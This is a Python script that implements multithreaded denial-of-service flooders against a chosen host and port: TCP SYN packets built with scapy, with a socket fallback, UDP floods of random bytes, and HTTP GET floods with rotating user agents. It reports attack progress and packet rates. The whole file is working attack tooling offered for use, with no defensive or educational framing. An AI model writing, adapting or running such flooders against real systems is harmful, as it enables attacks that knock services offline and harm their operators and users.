#!/usr/bin/env python3

import socket
import threading
import time
import random
import sys
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None

try:
    from scapy.all import IP, TCP, UDP, send, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"

class BaseFlooder:
    def __init__(self, target, port, threads, duration):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.packets_sent = 0
        self.running = False
        self.lock = threading.Lock()

    def increment_counter(self):
        with self.lock:
            self.packets_sent += 1

    def display_stats(self):
        print(f"\r{CYAN}Packets Sent: {GREEN}{self.packets_sent:,}{RESET} | {YELLOW}Time Elapsed: {{:.1f}}s{RESET}", end='', flush=True)

    def attack(self):
        raise NotImplementedError("Subclasses must implement attack method")

    def worker(self):
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            try:
                self.attack()
                self.increment_counter()
            except Exception:
                pass

    def start(self):
        print(f"\n{BOLD}{GREEN}Starting attack on {self.target}:{self.port}{RESET}")
        print(f"{YELLOW}Press Ctrl+C to stop early{RESET}\n")

        self.running = True
        self.packets_sent = 0

        threads_list = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads_list.append(t)

        start_time = time.time()

        try:
            while self.running:
                elapsed = time.time() - start_time
                if elapsed >= self.duration:
                    break
                print(f"\r{CYAN}Packets Sent: {GREEN}{self.packets_sent:,}{RESET} | {YELLOW}Time Elapsed: {elapsed:.1f}s{RESET}", end='', flush=True)
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}Attack interrupted by user{RESET}")

        self.running = False

        for t in threads_list:
            t.join(timeout=1)

        elapsed = time.time() - start_time
        print(f"\n\n{BOLD}{GREEN}Attack Complete{RESET}")
        print(f"{CYAN}═══════════════════════════════════════════════════════════{RESET}")
        print(f"  Total Packets: {GREEN}{self.packets_sent:,}{RESET}")
        print(f"  Duration: {GREEN}{elapsed:.2f} seconds{RESET}")
        print(f"  Average Rate: {GREEN}{self.packets_sent/elapsed:.2f} packets/sec{RESET}")
        print(f"{CYAN}═══════════════════════════════════════════════════════════{RESET}")

class TCPFlooder(BaseFlooder):
    def __init__(self, target, port, threads, duration):
        super().__init__(target, port, threads, duration)
        self.method = "scapy" if SCAPY_AVAILABLE else "socket"

    def attack(self):
        if self.method == "scapy" and SCAPY_AVAILABLE:
            self.attack_scapy()
        else:
            self.attack_socket()

    def attack_scapy(self):
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 4294967295)

        packet = IP(dst=self.target)/TCP(sport=src_port, dport=self.port, flags="S", seq=seq_num)
        send(packet, verbose=0)

    def attack_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((self.target, self.port))
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
            sock.close()
        except:
            pass

class UDPFlooder(BaseFlooder):
    def __init__(self, target, port, threads, duration, packet_size=1024):
        super().__init__(target, port, threads, duration)
        self.packet_size = packet_size
        self.payload = self.generate_payload()

    def generate_payload(self):
        return random._urandom(self.packet_size)

    def attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(self.payload, (self.target, self.port))
            sock.close()
        except:
            pass

class HTTPFlooder:
    def __init__(self, target, threads, duration):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.requests_sent = 0
        self.running = False
        self.lock = threading.Lock()

        if requests is None:
            print(f"{RED}Error: requests library not found{RESET}")
            print(f"{YELLOW}Install with: pip install requests{RESET}")
            sys.exit(1)

        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        ]

    def increment_counter(self):
        with self.lock:
            self.requests_sent += 1

    def attack(self):
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            response = requests.get(self.target, headers=headers, timeout=10)
            self.increment_counter()
        except:
            pass

    def worker(self):
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            self.attack()

    def start(self):
        print(f"\n{BOLD}{GREEN}Starting HTTP flood on {self.target}{RESET}")
        print(f"{YELLOW}Press Ctrl+C to stop early{RESET}\n")

        self.running = True
        self.requests_sent = 0

        threads_list = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads_list.append(t)

        start_time = time.time()

        try:
            while self.running:
                elapsed = time.time() - start_time
                if elapsed >= self.duration:
                    break
                print(f"\r{CYAN}Requests Sent: {GREEN}{self.requests_sent:,}{RESET} | {YELLOW}Time Elapsed: {elapsed:.1f}s{RESET}", end='', flush=True)
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}Attack interrupted by user{RESET}")

        self.running = False

        for t in threads_list:
            t.join(timeout=1)

        elapsed = time.time() - start_time
        print(f"\n\n{BOLD}{GREEN}Attack Complete{RESET}")
        print(f"{CYAN}═══════════════════════════════════════════════════════════{RESET}")
        print(f"  Total Requests: {GREEN}{self.requests_sent:,}{RESET}")
        print(f"  Duration: {GREEN}{elapsed:.2f} seconds{RESET}")
        print(f"  Average Rate: {GREEN}{self.requests_sent/elapsed:.2f} requests/sec{RESET}")
        print(f"{CYAN}═══════════════════════════════════════════════════════════{RESET}")
